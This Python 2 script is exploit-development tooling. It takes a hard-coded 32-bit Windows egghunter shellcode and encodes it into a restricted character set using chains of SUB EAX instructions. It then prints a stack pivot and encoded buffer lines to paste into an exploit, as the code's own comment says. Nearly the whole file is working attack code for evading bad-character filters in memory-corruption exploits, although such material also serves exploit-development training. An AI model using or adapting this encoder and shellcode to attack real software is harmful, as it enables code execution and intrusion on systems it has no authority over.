#!/usr/bin/env python

allowed_chars  = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

def encode():
	bytes_to_encode = [egghunter[i:i+4] for i in range(0,len(egghunter),4)]
	allowed_chars_array = [ord(char) for char in allowed_chars]
	final_val1 = []
	final_val2 = []
	# Iterate over 4 byte blocks of the egghunter
	for block in bytes_to_encode[::-1]:
		val1 = []
		val2 = []
		overflows = []
		# Get target bytes
		target = 0xFFFFFFFF - int("0x" + block[::-1].encode('hex'),16) + 1
		target_string = "%.08x" % target
		target_bytes = [int(target_string[i:i+2],16) for i in range(0, len(target_string), 2)]
		for i,target_byte in enumerate(target_bytes[::-1]):
			for char1 in allowed_chars_array:
				char2, overflow = find_second_char(allowed_chars_array, char1, target_byte)
				if (char2, overflow) != (-1, False):
					overflows = [overflow] + overflows
					val1 = [char1] + val1
					val2 = [char2] + val2
					break
		for i,_ in enumerate(val2):
			if i == 3: break
			if overflows[i+1]:
				val2[i] -= 1
		s = int(get_hex(val1),16) + int(get_hex(val1),16) + int(get_hex(val2),16)
		if check_values(val1, val2, block[::-1]):
			final_val1.append(get_hex(val1))
			final_val2.append(get_hex(val2))
		else:
			print "Error! Failed to encode target block %.08x" % block[::-1]
			exit(1)
	# Print some python you can paste into your exploit
	print_shellcode(final_val1,final_val2)


def find_second_char(allowed_chars, char1, target_byte):
	overflow = False
	for char2 in allowed_chars:
		if ((char1 + char1 + char2 ) & 0xFF) == target_byte:
			if char1 + char1 + char2 > 0xFF:
				s = char1 + char1 + char2
				overflow = True
			return char2, overflow
	return -1,False
# Math checks out?
def check_values(val1, val2, block):
	return (0x0 - int(get_hex(val1),16) - int(get_hex(val1),16) - int(get_hex(val2),16) & 0xFFFFFFFF ) == int("0x" + block.encode('hex'),16)

# Array of chars to correct hex representation as string
def get_hex(vals):
	s = ""
	for val in vals:					
		s = s + "%.02x" % val
	return s			

# Print the final shellcode - Python style
bytenize_string = lambda x: [int(x[i:i+2],16) for i in range(0, len(x), 2)]
restring_bytes = lambda l: "%.02x%.02x%.02x%.02x" % tuple(l)

def print_shellcode(final_val1, final_val2):
	zero_eax = """
buf += \"\\x25\\x4A\\x4D\\x4E\\x55\" # AND EAX,554E4D4A 
buf += \"\\x25\\x35\\x32\\x31\\x2A\" # AND EAX,2A313235
		"""
	stack_pivot = """
buf += \"\\x54\" # PUSH ESP
buf += \"\\x58\" # POP EAX
buf += \"\\x2d\\x66\\x4D\\x55\\x55\" # SUB EAX,55554D66
buf += \"\\x2d\\x66\\x4B\\x55\\x55\" # SUB EAX,55554B66
buf += \"\\x2d\\x6A\\x50\\x55\\x55\" # SUB EAX,5555506A
buf += \"\\x50\" # PUSH EAX
buf += \"\\x5C\" # POP ESP
"""
	print zero_eax
	print stack_pivot
	for v1, v2 in zip(final_val1, final_val2):
		print zero_eax
		s1 = iter(restring_bytes(bytenize_string(v1)[::-1]))
		s1 = "buf += \"\\x2D" + "\\x" + "\\x".join(a+b for a,b in zip(s1,s1)) + "\" # SUB EAX,%s" % v1
		s2 = iter(restring_bytes(bytenize_string(v2)[::-1]))
		s2 = "buf += \"\\x2D" + "\\x" + "\\x".join(a+b for a,b in zip(s2,s2)) + "\" # SUB EAX,%s" % v2
		print s1
		print s1
		print s2
		print "buf += \"\\x50\" # PUSH EAX\nbuf += \"\\x41\\x41\" # INC ECX; INC ECX;"
		#print v1, v2	


encode()		
